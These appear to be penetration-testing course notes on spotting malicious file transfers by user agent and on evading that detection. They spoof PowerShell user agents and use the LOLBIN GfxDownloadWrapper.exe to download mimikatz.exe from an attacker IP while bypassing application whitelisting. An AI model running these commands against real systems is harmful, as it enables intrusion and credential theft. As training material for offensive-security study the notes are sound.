### Detection

```
# Command-line detection based on blacklisting is straightforward to bypass, even using simple case obfuscation.
# However, although the process of whitelisting all command lines in a particular environment is initially time-consuming, 
# it is very robust and allows for quick detection and alerting on any unusual command lines.

# HTTP clients are most readily recognized by their user agent string, which the server uses to identify which HTTP client is connecting to it, 
# for example, Firefox, Chrome, etc.
# User agents are not only used to identify web browsers, but anything acting as an HTTP client and connecting to a web server via HTTP 
# can have a user agent string (i.e., cURL, a custom Python script, or common tools such as sqlmap, or Nmap).

# Organizations can take some steps to identify potential user agent strings by first building a list of known legitimate user agent strings.
# Any suspicious-looking user agent strings can then be further investigated to determine whether they were used to perform malicious actions.

# Malicious file transfers can also be detected by their user agents. 
# The following user agents/headers list below
# were observed from common HTTP transfer techniques (tested on Windows 10, version 10.0.14393, with PowerShell 5):

### Evading Detection

### Changing User Agent
```
# If diligent administrators or defenders have blacklisted any of these User Agents, Invoke-WebRequest contains a UserAgent parameter, 
# which allows for changing the default user agent to one emulating Internet Explorer, Firefox, Chrome, Opera, or Safari.

# Listing out User Agents

PS C:\htb>[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl

### LOLBAS / GTFOBins

```
# Application whitelisting may prevent you from using PowerShell or Netcat, and command-line logging may alert defenders to your presence.
# In this case, an option may be to use a "LOLBIN" (living off the land binary), alternatively also known as "misplaced trust binaries." 
# An example LOLBIN is the Intel Graphics Driver for Windows 10 (GfxDownloadWrapper.exe), 
# installed on some systems and contains functionality to download configuration files periodically. 
# This download functionality can be invoked as follows:

PS C:\htb> GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"      # Transferring File with GfxDownloadWrapper.exe

# Such a binary might be permitted to run by application whitelisting and be excluded from alerting. 
# Other, more commonly available binaries are also available, and it is worth checking the LOLBAS project to find a suitable "file download" 
# binary that exists in your environment. 

# Linux's equivalent is the GTFOBins project and is definitely also worth checking out. 
# As of the time of writing, the GTFOBins project provides useful information on nearly 40 commonly installed binaries 
# that can be used to perform file transfers.
```
